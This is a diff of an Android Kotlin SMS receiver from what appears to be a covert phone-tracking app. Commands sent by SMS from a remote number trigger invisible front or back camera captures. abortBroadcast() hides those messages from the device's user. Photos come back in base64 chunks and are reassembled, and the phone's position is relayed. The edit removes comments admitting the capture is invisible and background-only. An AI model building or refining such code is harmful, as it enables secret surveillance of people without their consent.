@@ -10,7 +10,6 @@ import android.telephony.SmsMessage
 import android.util.Log
 import java.io.File
 import java.io.FileOutputStream
-import java.util.Base64
 
 class DataSmsReceiver : BroadcastReceiver() {
     companion object {
@@ -18,7 +17,6 @@ class DataSmsReceiver : BroadcastReceiver() {
         var sendingJob: Pair<String, Handler>? = null
         var sendingRunnable: Runnable? = null
         
-        # 📸 Assemblage des photos reçues par fragments
         private val photoChunks = mutableMapOf<String, MutableList<String?>>()
     }
 
@@ -35,21 +33,18 @@ class DataSmsReceiver : BroadcastReceiver() {
             Log.d(TAG, "Reçu de $from: ${text.take(60)}...")
 
             when {
-                # 📸 IL reçoit "Prends une photo avant" → IL prend la photo INVISIBLE
                 text == Commands.REQUEST_PHOTO_FRONT -> {
-                    Log.d(TAG, "📸 DEMANDE PHOTO AVANT de $from — Prise en cours en arrière-plan !")
+                    Log.d(TAG, "📸 DEMANDE PHOTO AVANT de $from")
                     CameraCaptureService.capturePhoto(context, CameraCaptureService.FACING_FRONT)
                     abortBroadcast()
                 }
 
-                # 📸 IL reçoit "Prends une photo arrière" → IL prend la photo INVISIBLE
                 text == Commands.REQUEST_PHOTO_BACK -> {
-                    Log.d(TAG, "📸 DEMANDE PHOTO ARRIÈRE de $from — Prise en cours en arrière-plan !")
+                    Log.d(TAG, "📸 DEMANDE PHOTO ARRIÈRE de $from")
                     CameraCaptureService.capturePhoto(context, CameraCaptureService.FACING_BACK)
                     abortBroadcast()
                 }
 
-                # 📥 TU reçois des données photo → Assembler et sauvegarder
                 text.startsWith(Commands.RESPONSE_PHOTO) -> {
                     val data = text.removePrefix(Commands.RESPONSE_PHOTO).split("|", limit = 4)
                     if (data.size == 4) {
@@ -57,7 +52,6 @@ class DataSmsReceiver : BroadcastReceiver() {
                         val index = data[1].toIntOrNull() ?: 0
                         val total = data[2].toIntOrNull() ?: 1
                         val chunk = data[3]
-                        
                         assemblePhoto(context, filename, index, total, chunk)
                         abortBroadcast()
                     }
@@ -90,7 +84,9 @@ class DataSmsReceiver : BroadcastReceiver() {
                             MainMapActivity.instance?.updateOtherPosition(lat, lon, from)
                             FloatingWindowService.instance?.updatePosition(lat, lon, from)
                             abortBroadcast()
-                        } catch (e: Exception) {}
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Erreur parsing position", e)
+                        }
                     }
                 }
             }
@@ -106,15 +102,13 @@ class DataSmsReceiver : BroadcastReceiver() {
             
             val chunks = photoChunks[filename] ?: return
             if (chunks.all { it != null }) {
-                # ✅ Tous les fragments reçus → Reconstituer la photo
                 val fullBase64 = chunks.joinToString("")
                 photoChunks.remove(filename)
                 
                 try {
                     val bytes = android.util.Base64.decode(fullBase64, android.util.Base64.NO_WRAP)
                     val savedFile = savePhotoToGallery(context, filename, bytes)
-                    Log.d(TAG, "✅ Photo complète reçue: $filename (${bytes.size} octets)")
-                    
+                    Log.d(TAG, "✅ Photo complète reçue: $filename")
                     MainMapActivity.instance?.runOnUiThread {
                         MainMapActivity.instance?.onPhotoReceived(savedFile)
                     }
